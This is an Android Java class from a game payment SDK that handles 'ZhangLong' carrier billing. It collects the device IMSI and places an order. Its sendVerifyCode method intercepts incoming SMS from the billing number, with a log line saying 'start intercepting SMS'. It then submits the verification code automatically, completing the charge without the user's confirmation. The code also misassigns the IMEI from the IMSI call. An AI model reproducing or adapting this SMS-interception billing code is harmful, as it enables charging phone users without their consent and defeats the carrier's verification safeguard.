package mobi.zty.pay.sdk.zhanglong;

import java.io.IOException;
import java.net.UnknownHostException;
import java.util.Map;

import org.json.JSONObject;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.Util_G;

import com.ddo.client.DdoClient;

import android.app.Activity;
import android.content.Context;
import android.os.Handler;
import android.os.Message;

/**
 * 掌龙 支付管理类
 * @author Administrator
 *
 */
public class ZhangLongPayInstance extends PaymentInterf{
	private static ZhangLongPayInstance instance;
	private Handler callBHandler = null;
	private String orderId = ""; 
	private String order_id = "";
	
	public static ZhangLongPayInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized ZhangLongPayInstance scyMMpay(){
		if(instance==null){
			instance =  new ZhangLongPayInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		callBHandler = (Handler) parameters[0];
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		callBHandler.removeMessages(PayConfig.NATIVE_FEE_FAIL);
		FeeInfo feeInfo = (FeeInfo) parameters[0];
		if(feeInfo==null||feeInfo.sdkPayInfo==null){
			notiFyResult(PayConfig.SDK_INFO_NULL, "后台没给计费点","");
			Helper.sendPayMessageToServer(PayConfig.ZHANGLONG_PAY, "后台没给计费点", "0000000000");
			return;
		}
	    order_id = feeInfo.orderId;   //订单号
		
		final String payCode = feeInfo.sdkPayInfo.payCode;
		final int  cpId = Integer.parseInt(feeInfo.sdkPayInfo.appId);
		final String imsi = Helper.getIMSI(context);
		final String imei = Helper.getIMSI(context);
		
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				// TODO Auto-generated method stub
				DdoClient client  = new DdoClient();
				String result= "";
				try {
					result = client.genOrder(payCode, cpId,order_id, imsi, imei,(Activity) context);
				} catch (Exception e) {
					e.printStackTrace();
				}
				JSONObject json = Helper.getJSONObject(result);
				int stutas = Helper.getJsonInt(json, "code");
				orderId = Helper.getJsonString(json, "orderId");
				Util_G.debugE("ZHANGLONG_PAY", stutas+"");
				Helper.sendPayMessageToServer(PayConfig.ZHANGLONG_PAY, "掌龙支付请求开始", "0000000000");
				if(stutas==1){
					Util_G.debugE("ZHANGLONG_PAY", orderId);
					Helper.sendPayMessageToServer(PayConfig.ZHANGLONG_PAY, "掌龙支付开始发送验证码", "0000000000");
				}else{
					String msg = Helper.getJsonString(json, "msg");
					Helper.sendPayMessageToServer(PayConfig.ZHANGLONG_PAY, "掌龙支付请求失败，原因："+msg, "0000000000");
					notiFyResult(PayConfig.SP_PAY_FAIL, "支付失败", order_id);
				}
			}
		}).start();
		
	}
	
	@Override
	public void sendVerifyCode(Object... parameters) {
		// TODO Auto-generated method stub
		String sendFrom = (String) parameters[0];
		final String content = (String) parameters[1];
//		String orderId = (String) parameters[2];
		final FeeInfo feeInfo = GameSDK.getInstance().getFeeInfoByOrderId(order_id);
		if (feeInfo==null||feeInfo.verifyInfo==null) return;
		String vertifyNum = feeInfo.verifyInfo.vertifyNum;
		if(sendFrom.contains(vertifyNum)){
			Helper.sendPayMessageToServer(PayConfig.ZHANGLONG_PAY, "开始拦截短信", "0000000000");
			Util_G.debugE("ZHANGLONG_PAY", "开始拦截短信");
			new Thread(new Runnable() {
				
				@Override
				public void run() {
					DdoClient client  = new DdoClient();
					 Util_G.debugE("ZHANGLONG_PAY2", orderId);
					 Util_G.debugE("ZHANGLONG_PAY", content);
					 String result = "";
					 result = client.submitSms(orderId, content.trim());
//					 JSONObject json = Helper.getJSONObject(result);
//					 int code = Helper.getJsonInt(json, "code");
					 Util_G.debugE("result", result);
					 if(result.equals("ok")){
						 notiFyResult(PayConfig.BIIL_SUCC, "支付成功", order_id);
						 Util_G.debugE("ZHANGLONG_PAY", "支付成功");
						 Helper.sendPayMessageToServer(PayConfig.ZHANGLONG_PAY, "支付成功", "0000000000");
					 }else{
						 notiFyResult(PayConfig.SP_PAY_FAIL, "支付失败", order_id);
						 Util_G.debugE("ZHANGLONG_PAY", "支付失败");
						 Helper.sendPayMessageToServer(PayConfig.ZHANGLONG_PAY, "支付失败", "0000000000");
					 }
					
				}
			}).start();
			 
		}
		
		super.sendVerifyCode(parameters);
	}
	private void notiFyResult(int resutCode,String retMsg,String orderId) {
		PayResultInfo info = new PayResultInfo();
		info.resutCode = resutCode;
		info.retMsg = retMsg;
		Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
		message.obj = info;
		message.sendToTarget();
	}
	
}
